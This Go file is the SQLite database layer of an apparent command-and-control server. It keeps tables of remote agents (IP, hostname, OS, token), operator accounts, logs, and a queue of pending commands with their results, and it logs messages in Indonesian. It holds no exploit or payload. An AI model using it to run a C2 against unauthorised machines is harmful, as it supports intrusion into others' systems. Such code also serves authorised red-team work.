package database

import (
	"c2/config"
	"c2/utils"
	"database/sql"
	"encoding/json"
	"fmt"
	"log"

	_ "github.com/mattn/go-sqlite3"
)

func Connect() *sql.DB {
	db, err := sql.Open("sqlite3", config.DBPath)
	if err != nil {
		log.Fatal(err)
	}
	return db
}

func Setup() {
	db := Connect()
	defer db.Close()

	_, err := db.Exec(`CREATE TABLE IF NOT EXISTS agents (
		id TEXT PRIMARY KEY,
		ip TEXT NOT NULL,
		hostname TEXT NOT NULL,
		os TEXT,
		arch TEXT,
		token TEXT NOT NULL,
		last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
		registered_at DATETIME DEFAULT CURRENT_TIMESTAMP,
		tags TEXT,
		notes TEXT
	);`)
	if err != nil {
		log.Fatal(err)
	}

	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS users (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		username TEXT NOT NULL UNIQUE,
		password TEXT NOT NULL,
		token TEXT
	);`)
	if err != nil {
		log.Fatal(err)
	}

	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS logs (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		agent_id TEXT,
		message TEXT,
		timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
		FOREIGN KEY(agent_id) REFERENCES agents(id)
	);`)
	if err != nil {
		log.Fatal(err)
	}

	_, err = db.Exec(`
	CREATE TABLE IF NOT EXISTS commands (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		agent_id TEXT NOT NULL,
		command TEXT NOT NULL,
		status TEXT NOT NULL DEFAULT 'pending',
		result TEXT,
		created_at DATETIME NOT NULL,
		executed_at DATETIME
	);`)
	if err != nil {
		log.Fatal("[!] Failed to create commands table:", err)
	}

	fmt.Println("[*] Database initialized successfully!")
}

func AddUser(username, password string) error {
	db := Connect()
	defer db.Close()

	hashedPassword, err := utils.HashPassword(password)
	if err != nil {
		return err
	}

	_, err = db.Exec(`INSERT INTO users (username, password) VALUES (?, ?)`, username, hashedPassword)
	if err != nil {
		log.Println("Gagal tambah user:", err)
		return err
	}

	log.Println("[*] User", username, "berhasil ditambahkan.")
	return nil
}

func GetUserByUsername(username string) (*User, error) {
	db := Connect()
	defer db.Close()

	var user User
	err := db.QueryRow(`SELECT id, username, password, token FROM users WHERE username = ?`, username).
		Scan(&user.ID, &user.Username, &user.Password, &user.Token)

	if err != nil {
		if err == sql.ErrNoRows {
			return nil, nil
		}
		log.Println("Error querying user by username:", err)
		return nil, err
	}

	return &user, nil
}

func AddAgent(agent *Agent) error {
	db := Connect()
	defer db.Close()

	_, err := db.Exec(`INSERT INTO agents (id, ip, hostname, os, arch, token, last_seen, registered_at) 
		VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
		agent.ID, agent.IP, agent.Hostname, agent.OS, agent.Arch, agent.Token, agent.LastSeen, agent.RegisteredAt)

	if err != nil {
		log.Println("Gagal menambahkan agent:", err)
		return err
	}

	log.Println("[*] Agent", agent.ID, "berhasil ditambahkan.")
	return nil
}

func GetAllAgents() ([]Agent, error) {
	db := Connect()
	defer db.Close()

	rows, err := db.Query(`SELECT id, ip, hostname, os, arch, token, last_seen, registered_at, tags, notes FROM agents`)
	if err != nil {
		log.Println("Gagal mengambil data agents:", err)
		return nil, err
	}
	defer rows.Close()

	var agents []Agent
	for rows.Next() {
		var agent Agent
		var tags, notes sql.NullString

		err := rows.Scan(
			&agent.ID,
			&agent.IP,
			&agent.Hostname,
			&agent.OS,
			&agent.Arch,
			&agent.Token,
			&agent.LastSeen,
			&agent.RegisteredAt,
			&tags,
			&notes,
		)
		if err != nil {
			log.Println("Gagal scan data agent:", err)
			continue
		}

		if tags.Valid {
			err = json.Unmarshal([]byte(tags.String), &agent.Tags)
			if err != nil {
				log.Println("Gagal mengkonversi tags:", err)
				agent.Tags = []string{}
			}
		} else {
			agent.Tags = []string{}
		}

		if notes.Valid {
			agent.Notes = notes.String
		} else {
			agent.Notes = ""
		}

		agents = append(agents, agent)
	}

	return agents, nil
}

func DeleteAgent(agentID string) error {
	db := Connect()
	defer db.Close()

	_, err := db.Exec(`DELETE FROM agents WHERE id = ?`, agentID)
	if err != nil {
		log.Println("Gagal menghapus agent:", err)
		return err
	}

	log.Println("[*] Agent", agentID, "berhasil dihapus.")
	return nil
}

func UpdateTagsAndNotes(agentID string, tags []string, notes string) error {
	db := Connect()
	defer db.Close()

	tagsJSON, err := json.Marshal(tags)
	if err != nil {
		log.Println("Gagal encode tags:", err)
		return err
	}

	_, err = db.Exec(`UPDATE agents SET tags = ?, notes = ? WHERE id = ?`, string(tagsJSON), notes, agentID)
	if err != nil {
		log.Println("Gagal memperbarui Tags dan Notes untuk agent:", err)
		return err
	}

	log.Println("[*] Tags dan Notes untuk agent", agentID, "berhasil diperbarui.")
	return nil
}
